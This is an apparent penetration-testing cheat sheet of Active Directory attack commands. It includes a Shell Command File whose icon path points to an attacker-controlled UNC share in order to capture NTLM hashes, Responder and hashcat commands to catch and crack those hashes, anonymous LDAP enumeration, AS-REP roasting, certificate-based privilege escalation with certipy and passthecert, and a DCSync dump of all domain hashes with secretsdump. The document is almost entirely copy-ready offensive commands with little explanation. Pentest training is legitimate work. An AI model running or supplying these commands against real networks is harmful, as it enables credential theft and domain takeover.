# Active Directory Initial Attack Vectors
### SCF (Shell Command Files) FILE TO GATHER HASHES
```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

```
responder -wrf --lm -v -I eth0
```
**Crack Responder Hash**
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### LDAP NULL BIND
```
ldapsearch -x -b "dc=domain,dc=local" "*" -H ldap://10.10.10.169:389
```
```
ldapsearch -x -b "dc=domain,dc=local" "*" -H ldap://10.10.10.169:389 | awk '/dn: / {print $2}'
```
```
ldapsearch -x -b "dc=domain,dc=local" "objectclass=user" "description" "name" "samaccountname" -H ldap://10.10.10.169:389
```

### ASREP Roast
AS-REP roasting is an attack against Kerberos that allows password hashes to be retrieved for users that do not require pre-authentication. If the user has “Do not use Kerberos pre-authentication” enabled, then an attacker can recover a Kerberos AS-REP encrypted with the users RC4-HMAC’d password and he can attempt to crack this ticket offline.

```
impacket-GetNPUsers -dc-ip X.X.X.X doamin.local/ -usersfile users.txt -format john -outputfile hashes
```
```
john –-wordlist=/usr/share/wordlists/rockyou.txt hashes
```

# Active Directory Post Compromise
### Get All Domain Joined Computers
```
Get-ADComputer -Filter * -Properties  * | Select Name, DistinguishedName
```


# AD PrivEsc

### Pass the Certificate

**Extract key and cert from the pfx**
```
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
```

**Authenticate using certificate**
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip X.X.X.X
```

**Elevate a user for DCSYNC with passthecert.py**
```
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
```
### DCSync attack
**Dumping NTDS.dit**
```
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```
